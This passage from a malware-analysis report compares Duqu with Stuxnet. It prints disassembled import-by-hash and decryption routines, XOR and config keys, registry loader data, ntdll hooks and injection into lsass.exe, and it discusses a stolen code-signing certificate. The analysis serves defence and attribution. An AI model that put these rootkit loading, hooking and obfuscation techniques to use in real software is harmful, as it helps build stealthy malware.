searchin_dll2_100022C7\n.text:10001C52         mov   edi, eax\n.text:10001C54         mov   [esp+10h+var_10], 0E876E6Eh ; GetSecurityDescriptorDacl\n.text:10001C5B         call  searchin_dll2_100022C7\n.text:10001C60         push  0E1BD5137h   ; BuildExplicitAccessWithNameW\n.text:10001C65         mov   [ebp+var_C], eax\n.text:10001C68         call  searchin_dll2_100022C7\n.text:10001C6D         push  2F03FA6Fh    ; SetEntriesInAclW\n.text:10001C72         mov   ebx, eax\n.text:10001C74         call  searchin_dll2_100022C7\n.text:10001C79         push  0C69CF599h   ; MakeAbsoluteSD\n.text:10001C7E         mov   [ebp+var_4], eax\n.text:10001C81         call  searchin_dll2_100022C7\n.text:10001C86         push  0CE8CAD1Ah   ; SetSecurityDescriptorDacl\n.text:10001C8B         mov   [ebp+var_8], eax\n.text:10001C8E         call  searchin_dll2_100022C7\n.text:10001C93         push  9A71C67h    ; SetKernelObjectSecurity\n.text:10001C98         mov   [ebp+var_10], eax\n.text:10001C9B         call  searchin_dll2_100022C7\next:10002565         call  sub_1000211F\n.text:1000256A         mov   ecx, [ebp+var_4]\n.text:1000256D         mov   [ecx], eax\n.text:1000256F         push  4BBFABB8h    ; lstrcmpiW\n.text:10002574         call  searchin_dll1_100022B6\n.text:10002579         pop   ecx\n.text:1000257A         mov   ecx, [ebp+var_4]\n.text:1000257D         mov   [ecx+8], eax\n.text:10002580         push  0A668559Eh   ; VirtualQuery\n.text:10002585         call  searchin_dll1_100022B6\n.text:1000258A         pop   ecx\n.text:1000258B         mov   ecx, [ebp+var_4]\n.text:1000258E         mov   [ecx+0Ch], eax\n.text:10002591         push  4761BB27h    ; VirtualProtect\n.text:10002596         call  searchin_dll1_100022B6\n.text:1000259B         pop   ecx\n.text:1000259C         mov   ecx, [ebp+var_4]\n.text:1000259F         mov   [ecx+10h], eax\n.text:100025A2         push  0D3E360E9h   ; GetProcAddress\n.text:100025A7         call  searchin_dll1_100022B6\n.text:100025AC         pop   ecx\n.text:100025AD         mov   ecx, [ebp+var_4]\n.text:100025B0         mov   [ecx+14h], eax\n.text:100025B3         push  6B3749B3h    ; MapViewOfFile\n.text:100025B8         call  searchin_dll1_100022B6\n.text:100025BD         pop   ecx\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 22\n\n\n-----\n\n|.text:100025BE mov ecx, [ebp+var_4]|Col2|\n|---|---|\n|.text:100025C1 mov [ecx+18h], eax .text:100025C4 push 0D830E518h ; UnmapViewOfFile .text:100025C9 call searchin_dll1_100022B6 .text:100025CE pop ecx .text:100025CF mov ecx, [ebp+var_4] .text:100025D2 mov [ecx+1Ch], eax .text:100025D5 push 78C93963h ; FlushInstructionCache .text:100025DA call searchin_dll1_100022B6 .text:100025DF pop ecx .text:100025E0 mov ecx, [ebp+var_4] .text:100025E3 mov [ecx+20h], eax .text:100025E6 push 0D83E926Dh ; LoadLibraryW .text:100025EB call searchin_dll1_100022B6 .text:100025F0 pop ecx .text:100025F1 mov ecx, [ebp+var_4] .text:100025F4 mov [ecx+24h], eax .text:100025F7 push 19BD1298h ; FreeLibrary .text:100025FC call searchin_dll1_100022B6 .text:10002601 pop ecx .text:10002602 mov ecx, [ebp+var_4] .text:10002605 mov [ecx+28h], eax .text:10002608 push 5FC5AD65h ; ZwCreateSection .text:1000260D call searchin_dll3_100022D8 .text:10002612 pop ecx .text:10002613 mov ecx, [ebp+var_4] .text:10002616 mov [ecx+2Ch], eax .text:10002619 push 1D127D2Fh ; ZwMapViewOfSection .text:1000261E call searchin_dll3_100022D8 .text:10002623 pop ecx .text:10002624 mov ecx, [ebp+var_4] .text:10002627 mov [ecx+30h], eax .text:1000262A push 6F8A172Dh ; CreateThread .text:1000262F call searchin_dll1_100022B6 .text:10002634 pop ecx .text:10002635 mov ecx, [ebp+var_4] .text:10002638 mov [ecx+34h], eax .text:1000263B push 0BF464446h ; WaitForSingleObject .text:10002640 call searchin_dll1_100022B6 .text:10002645 pop ecx .text:10002646 mov ecx, [ebp+var_4] .text:10002649 mov [ecx+38h], eax .text:1000264C push 0AE16A0D4h ; GetExitCodeThread .text:10002651 call searchin_dll1_100022B6 .text:10002656 pop ecx .text:10002657 mov ecx, [ebp+var_4] .text:1000265A mov [ecx+3Ch], eax .text:1000265D push 0DB8CE88Ch ; ZwClose .text:10002662 call searchin_dll3_100022D8 .text:10002667 pop ecx .text:10002668 mov ecx, [ebp+var_4] .text:1000266B mov [ecx+40h], eax .text:1000266E push 3242AC18h ; GetSystemDirectoryW .text:10002673 call searchin_dll1_100022B6 .text:10002678 pop ecx .text:10002679 mov ecx, [ebp+var_4] .text:1000267C mov [ecx+44h], eax .text:1000267F push 479DE84Eh ; CreateFileW .text:10002684 call searchin_dll1_100022B6||\n\n\n**Sample 11 – netp191_res302 looking up imports in kernel32.dll**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 23\n\n\n-----\n\n```\n.text:10002197         mov   ecx, [edx]\n.text:10002199         add   ecx, ebx\n.text:1000219B         mov   al, [ecx]\n.text:1000219D         mov   [ebp+var_8], 0F748B421h\n.text:100021A4         test  al, al\n.text:100021A6         jz   short loc_100021C3\n.text:100021A8\n.text:100021A8 loc_100021A8:              ; CODE XREF: search_export_by_hash_1000214A+74 j �\n.text:100021A8         mov   ebx, [ebp+var_8]\n.text:100021AB         imul  ebx, 0D4C2087h\n.text:100021B1         movzx  eax, al\n.text:100021B4         xor   ebx, eax\n.text:100021B6         inc   ecx\n.text:100021B7         mov   al, [ecx]\n.text:100021B9         mov   [ebp+var_8], ebx\n.text:100021BC         test  al, al\n.text:100021BE         jnz   short loc_100021A8\n.text:100021C0         mov   ebx, [ebp+arg_0]\n.text:100021C3\n\n```\n.text:100021C3 loc_100021C3:              ; CODE XREF: search_export_by_hash_1000214A+5C j �\n```\n.text:100021C3         mov   eax, [ebp+var_8]\n.text:100021C6         cmp   [ebp+arg_4], eax ; compare argument magic to calculated hash\n.text:100021C9         jz   short loc_100021E0\n.text:100021CB         inc   [ebp+var_4]\n.text:100021CE         mov   eax, [ebp+var_4]\n.text:100021D1         add   edx, 4\n.text:100021D4         cmp   eax, [ebp+var_C]\n.text:100021D7         jb   short loc_10002197\n\n```\n**Sample 12 – Search loop and checksum calculation in cmi4432_res302 import by hash/checksum**\n\nThe checksum/hash calculation works on the export names without the terminating \\0\ncharacter. A constant is loaded first, then for each character of the name of the export, an\nimul is calculated over the partial hash and then the character is XORed to the result as\nshown above.\n\nWhile the trick of looking up import by hash is not unknown in malware code, this is another\nsimilarity between Duqu and Stuxnet. Note that the checksum calculation seems to be\ndifferent between the two codes. Note also that many security related functions, such as\nSetSecurityDescriptorDacl, are imported as seen in the sample above, which are most likely\nrelated to the functionality of Stuxnet described in [SymantecDossier] (page 14).\n\nFor the DLLs used by Duqu, we calculated the hash results. To simplify the work of others we\nuploaded the results to a publicly available web site, the download link is given in the\nDownload section of this document.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 24\n\n\n-----\n\n## 7. Hooks\n\nThe hook functions work in the same way for Stuxnet and Duqu. They both use non-existent\n“virtual” files for using libraries from modules.\n\nIn case of Duqu, this is sort151C.nls (or similar with random two byte hex string created from\nthe results of gettickcount() and process id) (Figure 9), while in case of Stuxnet it is\n_KERNEL32.DLL.ASLR.[HEXSTRING] or SHELL32.DLL.ASLR.[HEXSTRING], where HEXSTRING is a_\ntwo-byte random hex string. When these libraries are requested, the corresponding module\nis loaded into the address space of the process (see Figure 10 from [EsetMicroscope] for\nmore information).\n\n**Figure 9 – The hooks of Duqu and the non-existent emulated file**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 25\n\n\n-----\n\nThe Figure and Table below show that both Stuxnet and Duqu use the same hooks in ntdll.dll\nduring the injection process. Hooks usually used by rootkits are similar, however, the exact\nlist of the hooks is specific to a given rootkit family and can serve as a fingerprint.\n\n**Figure 10 – The hooks of Stuxnet [EsetMicroscope]**\n\nStuxnet Hook Duqu Hook\n\nZwMapViewOfSection ZwMapViewOfSection\n\nZwCreateSection ZwCreateSection\n\nZwOpenFile ZwOpenFile\n\nZwClose ZwClose\n\nZwQueryAttributesFile ZwQueryAttributesFile\n\nZwQuerySection ZwQuerySection\n\n**Table 5 – The hooked functions of ntdll.dll are exactly the same in both malware codes.**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 26\n\n|Stuxnet Hook|Duqu Hook|\n|---|---|\n|ZwMapViewOfSection|ZwMapViewOfSection|\n|ZwCreateSection|ZwCreateSection|\n|ZwOpenFile|ZwOpenFile|\n|ZwClose|ZwClose|\n|ZwQueryAttributesFile|ZwQueryAttributesFile|\n|ZwQuerySection|ZwQuerySection|\n\n\n-----\n\nIt is interesting, that antivirus programs do not detect this very strange functionality with\nnon-existent files and from the events we suppose to do changes in this field. During the\ninjection Duqu maps read/write/execute memory areas to system processes like lsass.exe. It\nis also very strange that anti-malware tools generally avoid to check these memory areas\nwhich are very rare to normal programs. So a general countermeasure might be to mitigate\nthese issues.\n\n## 8.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 27\n\n\n-----\n\n## 8. Payload and configuration encryption \n\nBoth jminet7.sys and cmi4432.sys are generic loaders for malware code, in a very similar\nway as mrxcls.sys works in the case of Stuxnet. [Chappell 2010] discusses that the loader in\nthe case of the Stuxnet is so general that it can be used to load any malware. The case is the\nsame for Duqu components: both kernel drivers work in the same way so here we only\nexplain the jminet7.sys process.\n\nThe Windows boot up process starts jminet7.sys as it is defined in the registry in\n**HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3** (note the\ndifference between jminet7 and JmiNET3). As jminet7.sys starts, it loads some configuration\n**(Config 1) variables from the .sys file itself and decrypts it** **(Decrypt 1). The configuration**\n**(Config 1)** contains the name of the registry key, where the variable configuration part is\nlocated, and the secret key to decrypt it. In our case, the “FILTER” key contains the\nconfiguration **(Config 2) in binary encrypted form. (In case of Stuxnet the process is the**\nsame, but configuration **(Config 2)** is stored under the key “DATA”). Now, the loader,\njminet7.sys reads the registry and decrypts configuration **(Config 2 / Decrypt 2).** This\ncontains the name of the PNF file (DLL) and the process name where the file should be\ninjected. Then, after 15 minutes of waiting time (not yet known if it is configurable or hardcoded) jminet7.sys loads and decrypts netp191.pnf (Decrypt 3).\n```\n [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3]\n\"Description\"=\"JmiNET3\"\n\"DisplayName\"=\"JmiNET3\"\n\"ErrorControl\"=dword:00000000\n\"Group\"=\"Network\"\n\"ImagePath\"=\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\Drivers\\\\jminet7.sys\"\n\"Start\"=dword:00000001\n\"Type\"=dword:00000001\n\"FILTER\"=hex:a0,35,58,da,32,ee,d5,01,c0,15,8b,1f,4b,5c,d1,a1,0b,8b,e7,85,1c,7f,\\\n 6e,f2,ef,31,6a,18,3c,80,78,c7,d4,c5,50,90,7a,78,66,9d,6b,93,00,a1,f5,3d,26,\\\n ce,cb,1c,1e,45,b0,ff,a0,dd,c0,a3,e8,58,31,0c,b2,a1,dd,11,37,ba,aa,1e,66,d3,\\\n 1f,b4,2f,e1,7c,eb,b6,a2,58,a0,25,62,77,b5,41,d3,71,02,1a,be,cb,bb,52,43,76,\\\n 43,b6,d0,67,25,19,10,27,67,a5,15,38,9f,8f\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3\\Enum]\n\"0\"=\"Root\\\\LEGACY_JMINET3\\\\0000\"\n\"Count\"=dword:00000001\n\"NextInstance\"=dword:00000001\n\n```\n**Sample 13 – Registry data for jminet7**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 28\n\n\n-----\n\nDuring the starting process 3 decryption processes are performed altogether, exactly as in\nStuxnet. Now, let’s compare the keys of the decryption operations.\n\nDescription Key\n\nCompiled-in configuration (Config-1) No key set, fixed decryption routine\n(essentially the same as key=0)\n\nVariable configuration in registry (Config-2) 0xAE240682 (loaded from Config-1)\n\nDecryption key for netp191.pnf 0xAE240682 (loaded from Config-2)\n\nKeys in the case of Duqu (jminet7 and cmi4432)\n\nDescription Key\n\nCompiled-in configuration (Config-1) key=0\n\nVariable configuration in registry (Config-2) 0xAE240682 (loaded from Config-1)\n\nDecryption key for oem7a.pnf 0x01AE0000 (loaded from Config-2)\n\nKeys in the case of Stuxnet (mrxcls.sys)\n\nOne can easily recognize that the same key is used in Stuxnet as in the case of Duqu. Note\nthat many keys contain “0xAE” and later we show more occurrences of this magic number.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 29\n\n|Description|Key|\n|---|---|\n|Compiled-in configuration (Config-1)|No key set, fixed decryption routine (essentially the same as key=0)|\n|Variable configuration in registry (Config-2)|0xAE240682 (loaded from Config-1)|\n|Decryption key for netp191.pnf|0xAE240682 (loaded from Config-2)|\n\n|Description|Key|\n|---|---|\n|Compiled-in configuration (Config-1)|key=0|\n|Variable configuration in registry (Config-2)|0xAE240682 (loaded from Config-1)|\n|Decryption key for oem7a.pnf|0x01AE0000 (loaded from Config-2)|\n\n\n-----\n\n```\n0000000000: 07 00 00 00 82 06 24 AE │ 5C 00 52 00 45 00 47 00 •  '♠$R\\ R E G\n0000000010: 49 00 53 00 54 00 52 00 │ 59 00 5C 00 4D 00 41 00 I S T R Y \\ M A\n0000000020: 43 00 48 00 49 00 4E 00 │ 45 00 5C 00 53 00 59 00 C H I N E \\ S Y\n0000000030: 53 00 54 00 45 00 4D 00 │ 5C 00 43 00 75 00 72 00 S T E M \\ C u r\n0000000040: 72 00 65 00 6E 00 74 00 │ 43 00 6F 00 6E 00 74 00 r e n t C o n t\n0000000050: 72 00 6F 00 6C 00 53 00 │ 65 00 74 00 5C 00 53 00 r o l S e t \\ S\n0000000060: 65 00 72 00 76 00 69 00 │ 63 00 65 00 73 00 5C 00 e r v i c e s \\\n0000000070: 4A 00 6D 00 69 00 4E 00 │ 45 00 54 00 33 00 00 00 J m i N E T 3\n0000000080: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000090: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000A0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000B0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000C0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000D0: 46 00 49 00 4C 00 54 00 │ 45 00 52 00 00 00 6C 00 F I L T E R  l\n00000000E0: 00 00 00 00 5C 00 44 00 │ 65 00 76 00 69 00 63 00   \\ D e v i c\n00000000F0: 65 00 5C 00 7B 00 33 00 │ 30 00 39 00 33 00 41 00 e \\ { 3 0 9 3 A\n0000000100: 41 00 5A 00 33 00 2D 00 │ 31 00 30 00 39 00 32 00 A Z 3 - 1 0 9 2\n0000000110: 2D 00 32 00 39 00 32 00 │ 39 00 2D 00 39 00 33 00 - 2 9 2 9 - 9 3\n0000000120: 39 00 31 00 7D 00 00 00 │ 00 00 00 00 00 00 00 00 9 1 }\n…\n\n```\n**Sample 14 – Decrypted Config-1 for Duqu from jminet7.sys, key in yellow**\n\n`0000000000: 00 00 00 00 01 00 00 00 │ 10 BB 00 00 01 00 03 00   ☺` - ☺ ♥\n```\n0000000010: 82 06 24 AE 1A 00 00 00 │ 73 00 65 00 72 00 76 00 '♠$R→  s e r v\n0000000020: 69 00 63 00 65 00 73 00 │ 2E 00 65 00 78 00 65 00 i c e s . e x e\n0000000030: 00 00 38 00 00 00 5C 00 │ 53 00 79 00 73 00 74 00  8  \\ S y s t\n0000000040: 65 00 6D 00 52 00 6F 00 │ 6F 00 74 00 5C 00 69 00 e m R o o t \\ i\n0000000050: 6E 00 66 00 5C 00 6E 00 │ 65 00 74 00 70 00 31 00 n f \\ n e t p 1\n0000000060: 39 00 31 00 2E 00 50 00 │ 4E 00 46 00 00 00 D2   9 1 . P N F  Ň\n\n```\n**Sample 15 – Decrypted Config-2 for Duqu jminet7.sys from registry**\n\nWe can see that the decryption and configuration processes of Duqu and Stuxnet are very\nsimilar. In both cases, the first decryption takes place just after the initialization of the driver,\nbefore checking for Safe mode and kernel Debug mode. In Stuxnet, the decryption is the call\nSUB_L00011C42, whereas in the case of Duqu it is the call SUB_L00011320 shown below.\n\nStuxnet’s 1[st] decryption call Duqu’s 1[st] decryption call\n\nL000103E1: L000105C4:\nmov byte ptr [L00014124],01h mov byte ptr [L00015358],01h\nmov dword ptr [ebp-1Ch],L00013E80 mov esi,L00015180\nL000103EF: L000105D0:\ncmp dword ptr [ebp-1Ch],L00013E84 mov [ebp-1Ch],esi\njnc L00010409 cmp esi,L00015184\nmov eax,[ebp-1Ch] jnc L000105E8\nmov eax,[eax] mov eax,[esi]\ncmp eax,ebx test eax,eax\njz L00010403 jz L000105E3\ncall eax call eax\nL00010403: L000105E3:\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 30\n\n|Stuxnet’s 1st decryption call|Duqu’s 1st decryption call|\n|---|---|\n|L000103E1: mov byte ptr [L00014124],01h mov dword ptr [ebp-1Ch],L00013E80 L000103EF: cmp dword ptr [ebp-1Ch],L00013E84 jnc L00010409 mov eax,[ebp-1Ch] mov eax,[eax] cmp eax,ebx jz L00010403 call eax L00010403:|L000105C4: mov byte ptr [L00015358],01h mov esi,L00015180 L000105D0: mov [ebp-1Ch],esi cmp esi,L00015184 jnc L000105E8 mov eax,[esi] test eax,eax jz L000105E3 call eax L000105E3:|\n\n\n-----\n\n|add dword ptr [ebp-1Ch],00000004h jmp L000103EF L00010409: xor eax,eax L0001040B: cmp eax,ebx jnz L000104BA mov al,[L00013E98] test al,al jz L00010433 xor eax,eax mov esi,00000278h mov ecx,L00013E99 call SUB_L00011C42 mov [L00013E98],bl L00010433: mov eax,[L00013E99] test al,01h jz L0001044C mov eax,[ntoskrnl.exe!InitSafeBootMode] cmp [eax],ebx jz L0001044C|add esi,00000004h jmp L000105D0 L000105E8: xor eax,eax L000105EA: test eax,eax jnz L00010667 mov edi,[ebp+0Ch] call SUB_L00011320 mov eax,[L00015190] test al,01h jz L00010611 mov ecx,[ntoskrnl.exe!InitSafeBootMode]|Col3|\n|---|---|---|\n\n\nWhy does the decryption of the configuration (Config-1) happen before the checks for Safe\nMode and kernel debugging? The reason is probably that the behavior of the malware upon\nthe detection of Safe Mode or kernel debugging is configurable; hence it needs the\nconfiguration (Config-1) before the checking. The last bit of the first byte of the configuration\n(L00013E99 in Stuxnet listing above) controls if the malware should be active during safe\nmode or not, and if the 7th bit controls the same if kernel mode debugging is active. Duqu\nimplements the same functionality with almost the same code.\n\nAn important difference between the Stuxnet and the Duqu decryption calls is that in the\ncase of Stuxnet calling the same subroutine does all three decryptions.\nIn the case of Duqu, the first decryption calls a slightly different routine, where the\ninstruction mov ecx, 08471122h is used as shown below. For the other two decryption calls,\nthis instruction is changed to XOR ecx, 08471122h. Thus, in the first case, ecx is a fixed\ndecryption key, and in the other two cases, ecx contains a parameter received from the call.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 31\n\n\n-----\n\n|Stuxnet decryption routine|Duqu decryption routine|Col3|\n|---|---|---|\n|SUB_L00011C42: push ebp mov ebp,esp sub esp,00000010h mov edx,eax xor edx,D4114896h xor eax,A36ECD00h mov [ebp-04h],esi shr dword ptr [ebp-04h],1 push ebx mov [ebp-10h],edx mov [ebp-0Ch],eax mov dword ptr [ebp-08h],00000004h push edi L00011C6A: xor edx,edx test esi,esi jbe L00011C87 mov al,[ebp-0Ch] imul [ebp-08h] mov bl,al L00011C78: mov al,[ebp-10h] imul dl add al,bl xor [edx+ecx],al inc edx cmp edx,esi jc L00011C78 L00011C87: xor eax,eax cmp [ebp-04h],eax jbe L00011CA2 lea edx,[esi+01h] shr edx,1 lea edi,[edx+ecx] L00011C96: mov dl,[edi+eax] xor [eax+ecx],dl inc eax cmp eax,[ebp-04h] jc L00011C96 L00011CA2: lea eax,[esi-01h] jmp L00011CAF L00011CA7: mov dl,[eax+ecx-01h] sub [eax+ecx],dl dec eax L00011CAF: cmp eax,00000001h jnc L00011CA7 dec [ebp-08h] jns L00011C6A pop edi pop ebx leave retn|SUB_L00011320: push esi mov ecx,08471122h xor esi,esi jmp L00011330 Align 8 L00011330: xor [esi+L00015190],cl ror ecx,03h mov edx,ecx imul edx,ecx mov eax,1E2D6DA3h mul edx mov eax,ecx imul eax,04747293h shr edx,0Ch lea edx,[edx+eax+01h] add esi,00000001h xor ecx,edx cmp esi,000001ACh jc L00011330 mov ax,[L00015198] test ax,ax pop esi jnz L00011382 movzx ecx,[edi] mov edx,[edi+04h] push ecx push edx push L00015198 call jmp_ntoskrnl.exe!memcpy add esp,0000000Ch L00011382: retn||\n\n\n**Sample 16 – Decryption routine comparison**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 32\n\n\n-----\n\nIt is very hard to precisely characterize the similarities of the kernel driver codes of Duqu and\nStuxnet. In the screenshot below, we present the registry loaders, and the decrypting part of\nthe two. They are very similar, but there are clear differences. It is clearly interesting, but as\nwe don’t have enough expertise, it would be just mere speculation from us to say which\ncode is originated from which code, or if one code is based on the reverse-engineering of the\nother, or, at the end, it is also possible that someone wanted to write a Stuxnet-alike clone\nand he/she wanted to us to believe that the authors have relations.\n\n**Figure 11 – registry loader and decrypting part. Left: Stuxnet – Right: Duqu loader**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 33\n\n\n-----\n\n**Figure 12 – registry data of Duqu**\n\n**Figure 13 – registry data of Duqu**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 34\n\n\n-----\n\n## 9. PNF config file encryption\n\nIn case of Stuxnet, a PNF file, mdmcpq3dd.pnf contains configuration information that is\nused by the payload (injected DLL), e.g. it contains the names of the Command & Control\nservers. This file in our Stuxnet sample is 6619 bytes long, and the first part of the\nconfiguration is encrypted by simple XOR with 0xFF. The last half of the configuration seems\nto be encrypted by different means.\n\nIn Duqu, the configuration file is encrypted by XOR operations with the 7-byte key (0x2b\n0x72 0x73 0x34 0x99 0x71 0x98), the file is 6750 bytes long. Its content is not yet fully\nanalyzed; it mainly contains strings about the system itself, but not the name of a C&C\nserver.\n\nAfter decryption, Duqu checks if the file begins with 09 05 79 AE in hex (0xAE790509 as\ninteger). We can thus observe another occurrence of the magic number AE. Note that\nStuxnet’s config file mdmcpq3.pnf also begins with this magic number. Interestingly, the\nroutine in Duqu also checks if the fifth byte is 0x1A. Moreover, at position 0xC, the\ndecrypted config file repeats the size of the file itself (0x1A5E), where in case of Stuxnet, this\nsize parameter only refers to the size of the first part of the configuration file (0x744 = 1860\nbytes)\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 35\n\n\n-----\n\n## 10. Comparison of cmi4432.sys and jminet7.sys\n\nOne could ask what is the difference between cmi4432.sys and jminet7.sys? The main\ndifference is of course the digital signature. jminet7.sys is not signed, and thus, it is shorter.\nIf we remove the digital signature from cmi4432.sys we find that both files are 24 960 bytes\nlong.\n\nA basic binary comparison discovers only very tiny differences between the two codes. 2-3\nbytes are different in the header part, but then the code section is totally identical. The\nencrypted configuration sections inside the drivers are slightly different (as we know they\ncontain references to different registry services). Finally, at the end of the driver binaries,\nthe driver descriptive texts are different due to the references to JMicron and C-Media as\nauthors.\n\nIn summary, we can conclude that jminet7.sys and cmi4432.sys are essentially identical,\nexcept for the identifiers and the digital signature. In addition, from their functionality we\ncan assert that cmi4432.sys is a malware loader routine, so the digital signature on it cannot\nbe intentional (by the manufacturer).\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 36\n\n\n-----\n\n**Figure 14 – Comparing the hexdumps**\n\n**Figure 15 – JmiNET3 service in registry**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 37\n\n\n-----\n\n## 11. Code signing and its consequence\n\nDigital signatures are used to assert the identity of the producer of software and the\nintegrity of the code. Code signing is used to prevent untrusted code from being executed.\nDuqu’s cmi4432.sys is signed by C-Media Electronic Inc., with a certificate that is still valid at\nthe time of this writing (see related Figures).\n\nC-Media's parent in the trust chain is Verisign Inc., the certificate was issued on 2009.08.03,\nit uses the SHA1 hash function (it's not MD5 which has known weaknesses), and it belongs to\nClass 3 certificates that provide a highest security level requiring for example physical\npresence at the enrollment. The timestamp is set to 1899.12.30, which probably signifies\nthat no timestamp was given at the time of signing.\n\nApparent similarities with the Stuxnet malware suggest that the private key of C-Media\nmight have been compromised and this calls for immediate revocation of their certificate\ninvalidating the public key. Interestingly, in the Stuxnet case it was speculated that an\ninsider's physical intrusion led to the compromise of the private keys of the involved\nhardware manufacturer companies RealTek and JMicron as they were both located in\nHsinchu Science and Industrial Park, Hsinchu City, Taiwan. Although the current compromise\nstill affects a company in Taiwan, it is located in Taipei. There is no evidence for a large-scale\ncompromise of Taiwanese hardware manufacturers, but the recurrence of events is at least\nsuspicious.\n\nImmediate steps are needed to mitigate the impact of the malware. Similar to the Stuxnet\ncase, the certificate of C-Media needs to be revoked and C-Media’s code-signing process\nmust be thoroughly audited by Verisign Inc. or any other top-level CA that would issue a new\ncertificate for C-Media. Revocation of the compromised certificate mitigates the spreading\nof the malware, because Windows does not allow new installations of the driver with a\nrevoked certificate. This does not solve the problem completely, because already installed\ndrivers may keep running.\n\nIn the following pages we include some screenshots showing the digital signature on the\naffected malware kernel rootkit driver. In one of the figures, we also show that Windows\nstated that the certificate was still valid on October 5, 2011 with recent revocation\ninformation.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 38\n\n\n-----\n\n**Figure 16 – New CMI4432 rootkit loader header data.**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 39\n\n\n-----\n\n**Figure 17 – New CMI4432 rootkit loader with valid digital signature from C-Media Eletronics Inc,TW.**\n**Screenshot printed on October 5, 2011.**\n\n**Figure 18 – Signature details. No timestamp is available on the signature.**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 40\n\n\n-----\n\n**Figure 19 – Signature check on CMI4432.SYS on Windows – fresh revocation data proves validity**\n**RSA-1024+SHA1 is in use**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 41\n\n\n-----\n\n**Figure 20 – Signature details**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 42\n\n\n-----\n\n## 12. Initial delay, lifespan, behavior\n\nThere are several timers and delays related to Duqu. During kernel driver startup, the\ninjection of the code (in our case into lsass.exe) happens only after a wait time of about 15\nminutes. In some cases we experienced additional injected threads coming up “next day\nmorning” from the time of startup, but this behavior requires further investigation. An\nunknown timer controls Duqu’s lifetime. If the time passes this deadline Duqu removes its\nhooks, deletes it’s sys kernel driver and it’s PNF files, and removes it’s registry key.\n\nCurrently, we were unsuccessful to install the malware manually by copying the individual\ncomponents and setting the registry. We tried to infect a computer with a working sample,\nbut even if another Win XP computer’s C drive is shared and connected to the infected\ncomputer, we found no infections. Most likely, the local infection is controlled by the\ncommunication module.\n\nWe have certain unanswered question about parts of Duqu. netp191 resource 302 contains\na .zdata section which is most likely compressed by some Lempel-Ziv code. The\ncommunication module contains signs of using LZO 2.03. However, we were yet unable to\ndecompress this part. We suspect that the part is a copy of the 302 resource itself and the\ncompressed version of the communication module. However, from our experience, it seems\nthat the jminet7-netp191 alone can start the communication module, that would mean that\nnetp191 or it’s resource 302 can decompress/decrypt the attached communication module.\nIn a contradiction, there is no reference to LZO in netp191, or resource 302. We analysed\nresource 302 and found that basically cmi432’s and netp191’s resource 302 are the same\nexcept the .zdata section and there are clearly no indications about the compression\nalgorithm.\n\nCurrently we believe that some kind of LZO decompression routine exists in netp191.pnf\nmain part that uses the .zdata section of it’s 302 resource.\n\nOne additional thing is that some STL related stuff exists very close to the .zdata related\nsections in the communication module. In netp191 there are about 1792 6-byte data and 1byte “0x00” blocks near some STL related information. These things are suspicious, however\nwe had no time, so we stop here and publish our results to fasten up investigations.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 43\n\n\n-----\n\n## 13. Other components\n\n### 13.1. Keylogger\n\nNo direct network communication was observed from the keylogger.\n\nWe checked the binary against virus scanner databases on some online tools. Interestingly,\nfor GFI somebody already submitted the sample before we obtained a sample for the\nkeylogger:\n\nhttp://www.sunbeltsecurity.com/cwsandboxreport.aspx?id=85625782&cs=F61AFBECF2457\n197D1B724CB78E3276E\n\nIn recent weeks, many virus scanners enlisted the software in their malware database.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 44\n\n\n-----\n\n.text:00401B96 xorcryptor_b31f_at_401b96 proc near   ; CODE XREF: sub_401C86+13 p �\n\n.text:00401B96                     ; loadsomemodule_401CE4+13 p ... �\n```\n.text:00401B96\n.text:00401B96 addr_ciphertext = dword ptr 4\n.text:00401B96 addr_target   = dword ptr 